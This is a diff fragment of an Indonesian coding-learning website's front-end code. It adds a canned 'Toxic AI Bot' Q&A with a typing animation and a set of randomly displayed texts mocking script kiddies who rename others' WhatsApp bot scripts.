+  a: "Pertama: otak. Kedua: ngerti struktur WA. Ketiga: jangan asal copas dari TikTok. Bikin function bug itu ngulik behavior internal WA. Kalau masih nanya 'dimana file crash?', yaudah deh, liat story aja sana."
+},
+{
+  q: "Kenapa Function Bug kadang gak efek?",
+  a: "Karena WA update, bug-nya udah ditambal. Atau mungkin target lu bukan beban, jadi ga nge-lag. Atau mungkin... function lu cuma rename dari repo orang yang udah expired sejak 2022. Sedih tapi nyata."
+},
+{
+  q: "Script Bot WhatsApp gak jalan?",
+  a: "Karena salah semua. Salah pasang module, salah auth, salah tulis command. Kadang bukan salah kode — tapi salah orang yang maksa ngoding padahal nyalain termux aja masih tanya-tanya."
+},
+{
+  q: "Apa itu API?",
+  a: "API itu jembatan komunikasi antar sistem. Bukan nama merek minuman, bukan shortcut jadi hacker. Kalau lu nanya ini, kayaknya baca ‘endpoint’ aja udah mikir itu lokasi parkir mobil."
+},
+{
+  q: "Cara Deploy ke VPS?",
+  a: "Lu cari 'cara deploy VPS', padahal buka WinSCP aja masih bingung. Install Node.js, PM2, git clone, run. Tapi percuma dijelasin kalau mental lu cuma kuat rename script dan pamer QR bot di grup."
+},
+{
+  q: "Apa itu obfuscator?",
+  a: "Obfuscator itu alat buat ngacak source code biar gak gampang dicuri. Tapi kalo kode asli aja dari hasil colongan, terus lu obfuscate, ya sama aja maling nutupin jejak pake sandal bolong. Paham?"
+},
+{
+  q: "Kenapa web gue lemot?",
+  a: "Karena lu bangun web isinya 4MB PNG, 12 script anime, dan semua tombol glowing kayak disko. Belum lagi koneksi Indihome numpang tetangga. Jangan salahin coding, salahin gaya hidup."
+},
+{
+  q: "Gimana bikin bot anti-detect?",
+  a: "Pertama-tama, sadari dulu... bot lu ketahuan bukan karena API, tapi karena kelakuan. Delay gak natural, user-agent seragam, scraping brutal. Mau stealth? Belajar jadi manusia dulu, bukan tukang spam."
+}
+];
+function bukaToxicAiBot() {
+  document.getElementById("dashboard").style.display = "none";
+  document.getElementById("toxicAiBot").style.display = "block";
+}
+
+  function typeTextInNewBubble(q, a) {
+    const output = document.getElementById("toxicOutput");
+
+    // Buat elemen pertanyaan (kanan)
+    const pertanyaan = document.createElement("div");
+    pertanyaan.style = `
+  align-self: flex-end;
+  background: #66ccff;
+  color: #000;
+  padding: 14px 18px;
+  border-radius: 18px;
+  max-width: 75%;
+  font-weight: bold;
+  box-shadow: 0 0 8px #33ccff88;
+  margin: 0;
+`;
+    pertanyaan.innerHTML = `${q}`;
+    output.appendChild(pertanyaan);
+
+    // Buat elemen jawaban (kiri)
+    const jawaban = document.createElement("div");
+    jawaban.style = `
+  align-self: flex-start;
+  background: #2b2b2b;
+  color: #c0c0c0;
+  padding: 14px 18px;
+  border-radius: 18px;
+  max-width: 85%;
+  font-weight: normal;
+  box-shadow: 0 0 8px #8883;
+  min-height: 60px;
+  white-space: pre-wrap;
+  margin: 0;
+`;
+    output.appendChild(jawaban);
+
+    // Animasi ngetik
+    let i = 0;
+    function typing() {
+      if (i < a.length) {
+        jawaban.innerHTML += a.charAt(i);
+        i++;
+        setTimeout(typing, 15);
+        output.scrollTop = output.scrollHeight; // auto scroll ke bawah
+      }
+    }
+    typing();
+  }
+
+  function jawabToxicSelect() {
+    const selectedIndex = document.getElementById("toxicSelect").value;
+    const item = toxicQA[selectedIndex];
+    typeTextInNewBubble(item.q, item.a);
+  }
+  
+  const toxicTexts = [
+  `Website ini bukan buat lo yang tiap hari hidup dari nge-banned WA orang terus teriak "gue hacker". Lah hacker dari mana? Nge-click script orang aja udah panik kalau ada tulisan 'error'. Mental epep, bukan developer.Makanya Developer ZalOfficial ciptain website ini, biar yang begini bisa belajar atau sadar diri sebelum rename lagi script orang.`,
+
+  `Lo ngaku dev? Tapi kerjaan lo tiap malam cuma rename file ZIP, ubah nama jadi "Nama Lu Modz V99 FINAL". Isinya? Script hasil comot forum sebelah. Bangga banget ya? Mental dev tapi kerjaan kayak tukang rombak kardus. 
+  Makanya Developer ZalOfficial ciptain website ini, supaya lo paham koding beneran, bukan hidup dari modifikasi script orang.`,
+
+  `Datang ke sini cuma buat cari script auto famous biar bisa dipamerin ke grup WA? Close aja tab-nya. Web ini bukan buat spesies kagetan yang panik liat "npm install". Lo bukan developer, lo pencari template. Makanya Developer ZalOfficial ciptain website ini, biar lo berhenti mikir terminal itu tempat teleport ke dunia lain.`,
+
+  `Bangga bisa banned nomor WA? Anjay... keren banget tahun 2022. Sekarang 2025, bro. Orang udah bikin AI chatbot, lo masih stuck di bug wa. Makanya Developer ZalOfficial ciptain website ini, biar lo sadar betapa jadulnya lo dan belajar sesuatu yang relevan.`,
+
+  `Sok ngaku elite cyber, padahal skill cuma spam invisible chat dan bug delay. Udah kayak anak TK ngambek bawa stikernya hilang. Makanya Developer ZalOfficial ciptain website ini, biar bocil kayak lo punya tempat buat buka mata dan perbaiki otak.`,
+
+  `Rename script? Ganti author doang? Terus di-upload ulang pake watermark lo? Lah itu bukan developer, itu editor CapCut.Makanya Developer ZalOfficial ciptain website ini, biar mental lo bisa upgrade sebelum nyentuh file .js lagi.`,
+
+  `Website ini dibuat biar kalian yang otaknya idle 24 jam bisa belajar sesuatu. Kalau masih nanya "cara buka terminal gimana", mending uninstall otak dulu dan install ulang logika. Karena belajar coding itu bukan buat yang otaknya kayak flashdisk 2GB full lagu TikTok.`,
+
+  `Ini bukan playground bocil. Ini tempat belajar coding, server, sama debugging. Yang niatnya cuma copy-paste biar keliatan jago, mending buka YouTube kartun aja. Jangan cemari web ini pake mental gratisan tanpa otak, yang nanya error aja masih takut buka terminal.`,
+
+  `Jangan kira ini web tutorial gratisan buat nambah viewer doang. Ini tempat orang yang pengen ngerti beneran. Kalo lo masih ngira 'console.log' itu nama bot, fix otak lo perlu restart pakai solder panas. Ngetik ` + "`node index.js`" + ` aja takut error.`,
+
+  `Website ini bukan buat gaya-gayaan pasang banner "Dev" tapi error aja nggak ngerti. Ini buat lo yang capek jadi beban grup, dan pengen bisa beneran bikin project tanpa jadi beban hidup admin tiap hari. Rename SC bukan achievement, bro.`,
+
+  `Kalau masih nanya "cara buka file .js", tolong... serahkan HP ke orang tua lo dan minta dibelikan buku gambar. Coding itu buat yang punya logika, bukan yang pikirannya mentok di mod-menu, banned-bannedan, sama spam bug viewOnce ke grup WA random.`,
+
+  `Jangan main ke sini kalo lo cuma pengen kelihatan keren di grup WA. Website ini bukan tempat upgrade tampang, ini tempat upgrade otak. Jadi kalo IQ lo masih loading, better cabut dulu deh. Coding itu buat yang tahan error, bukan panik liat warna merah di terminal.`,
+
+  `Belajar di sini nggak pake shortcut. Lo harus baca, paham, dan mikir. Bukan spam “udah jadi belum bang?” di komentar sambil berharap dijadiin murid spesial padahal mental masih sc obfus rename hasil repost dari channel Telegram receh.`,
+
+  `Lo ngaku cyber, tapi kerjaan tiap hari cuma pamer bug banned dan nanya script install Baileys. Sekali-kali buka docs lah, jangan buka menu rename. Lo kira inject payload itu masak mie instan? Sadar diri lah, jangan ngasih harapan palsu ke otak sendiri.`,
+
+  `Kalau lo pikir belajar coding bisa kelar dalam 1 malam karena habis rename sc, lo salah besar. Ini bukan tempat buat bocah pamer "Termux Termos", ini tempat orang upgrade skill. Kalo nggak kuat mikir, cabut sekarang sebelum browser lo freeze bareng IQ lo.`,
+
+  `Makanya Developer ZalOfficial ciptain website ini buat lo semua yang skill-nya mentok di spam bug viewOnce, banned grup, rename script jadi milik pribadi, terus ngaku “Dev WA V13”. Ini bukan tempat banggain SC hasil copas, tapi buat ngebuktiin otak lo masih bisa diajak kerja.`,
+
+  `Masih bangga pasang status "Dev | Hacker | Elite" padahal buka .env aja tanya: "Bang, ini apa ya?" Jangan sedih. Itu penyakit umum.Makanya Developer ZalOfficial ciptain website ini, buat jadi klinik darurat untuk mental yang sok-sokan ngaku dev tapi buka terminal aja gemeteran.`,
+
+  `Lo liat website ini, kesel? Gatel? Merasa disindir? Nah, berarti lo target utama website ini. Makanya Developer ZalOfficial ciptain website ini, khusus buat lo yang hidup dari skill bug, banned, rename, terus ngaku-ngaku developer di bio.`
+];
+
+  const randomText = toxicTexts[Math.floor(Math.random() * toxicTexts.length)];
+  document.getElementById("toxicText").innerText = randomText;
+  function kembaliDashboard() {
+  // Sembunyikan SEMUA fitur yang pakai class "glass"
+  document.querySelectorAll(".glass").forEach(div => {
+    div.style.display = "none";
+  });
+
+  // Hentikan timer kuis kalau ada
+  if (typeof kuisCountdown !== "undefined") clearInterval(kuisCountdown);
+
+  // Tampilkan dashboard
+  document.getElementById("dashboard").style.display = "block";
+}
+
+    window.addEventListener('DOMContentLoaded', () => {
+      const saved = localStorage.getItem("devUser");
+      if (saved) {
+        document.getElementById("loginContainer").style.display = 'none';
+        document.getElementById("dashboard").style.display = 'block';
+        document.getElementById("welcomeMsg").textContent = ``;
+      }
+    });
+  </script>
+  
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/codemirror.min.css" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/codemirror.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/javascript/javascript.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/htmlmixed/htmlmixed.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/css/css.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/python/python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/xml/xml.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/markdown/markdown.min.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/theme/material-darker.min.css" />
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet">
+</body>
+</html>
